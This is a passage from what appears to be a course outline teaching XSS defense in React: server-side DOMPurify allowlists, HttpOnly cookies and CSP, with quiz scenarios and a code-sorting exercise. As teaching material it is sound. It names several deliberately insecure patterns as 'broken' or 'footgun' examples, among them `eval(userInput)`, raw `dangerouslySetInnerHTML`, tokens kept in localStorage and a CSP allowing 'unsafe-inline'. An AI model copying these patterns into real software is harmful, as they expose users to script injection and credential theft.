DOM unmolested, the script executing, the cookie being safe (layer 2 holds) but everything else the script can do — DOM manipulation, fake form submissions as the user, reading non-`HttpOnly` storage — is now in play. *Tab 2 (sanitized)*: same JSX, but `post.body` is the result of `DOMPurify.sanitize(post.body, { ALLOWED_TAGS: ['p','br','strong','em','a','ul','ol','li','h1','h2','h3'], ALLOWED_ATTR: ['href'], ALLOWED_URI_REGEXP: /^https?:\/\//i })` running in a Server Component (`isomorphic-dompurify` for the Node API) before the string ever reaches the browser. The senior reflexes ride the `Aside` below: never reach for `dangerouslySetInnerHTML` without a load-bearing reason; when reaching, sanitize server-side; allowlist tags and attrs (whitelist, not blocklist); review the sanitization config like a firewall rule.

**Engagement.** A `MultipleChoice` round of three scenarios: *"the team's marketing CMS allows authors to write rich-text post bodies; the team renders them with `dangerouslySetInnerHTML` because 'authors are trusted'"* — the right answer names the senior reflex (every input is reachable by some path; a CMS author account compromise becomes stored XSS for every reader; sanitize anyway), names the sanitization shape (server-side, allowlist, the config above); *"the team puts a short-lived auth token in `localStorage` 'because the session cookie is `HttpOnly` and they need a token for the API'"* — the right answer names the asymmetric trade (the token in `localStorage` is readable by every script — a successful XSS reads it; the senior alternative is in-memory only with refresh, or a separate `HttpOnly` cookie for the API call, never `localStorage` for credentials); *"the team copies a CSP from a Stack Overflow answer with `script-src * 'unsafe-inline' 'unsafe-eval'`"* — the right answer names this as defeating the defense entirely and points at 17.3 as the chapter that owns CSP authoring with nonces and `'strict-dynamic'`. Confirmed by a `Buckets` sort: ten code patterns into three columns — *safe (React handles it)*, *footgun (named, requires discipline)*, *broken (ship the bug)*. Examples: `<p>{userComment}</p>` (safe — auto-escape), `<a href={userUrl}>` with no scheme validation (footgun — `javascript:` slips through on older React), `<div dangerouslySetInnerHTML={{ __html: rawUserHtml }} />` (broken — no sanitization), `<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(rawUserHtml) }} />` with no allowlist config (footgun — defaults are weak, allowlist is the discipline), `localStorage.setItem('token', ...)` (broken — credential in JS-readable storage), `document.cookie` from app code (footgun — never read auth cookies; reach for the server's `getCurrentUser` instead), `<a target="_blank" href={url}>` with no `rel="noopener noreferrer"` (footgun — window.opener vector), `eval(userInput)` (broken — never), `setTimeout(userFunctionString, 1000)` (broken — string-arg `setTimeout` is `eval` in disguise), `<a href={validatedHttpsUrl}>` with scheme validation (safe).

**Components.**
- `Figure` wrapping a hand-SVG three-layer defense diagram (React escape / `HttpOnly` cookie / CSP-named).
- `CodeVariants` for the broken/sanitized `dangerouslySetInnerHTML` shape with the `DOMPurify` allowlist config inline in tab 2.
- `MultipleChoice` for the three-scenario round.
- `Buckets` for the ten-pattern safe/footgun/broken sort.
- `Aside` (`caution`) below the variants: "React 19 escapes by default; `HttpOnly` keeps the cookie out of script reach; `dangerouslySetInnerHTML` is the one named bypass — sanitize server-side, allowlist tags and attrs, never `localStorage` for credentials, CSP is 17.3's territory."

**Project link.** The 9.5 project doesn't render user-supplied HTML; the three-layer diagram is the *why* the project's lesson 9.5.6 verification confirms the `__Host-session` cookie has `HttpOnly` set and confirms no auth-shaped data sits in `localStorage` or `sessionStorage` — both are quick DevTools reads, both close real footgun categories the chapter named.
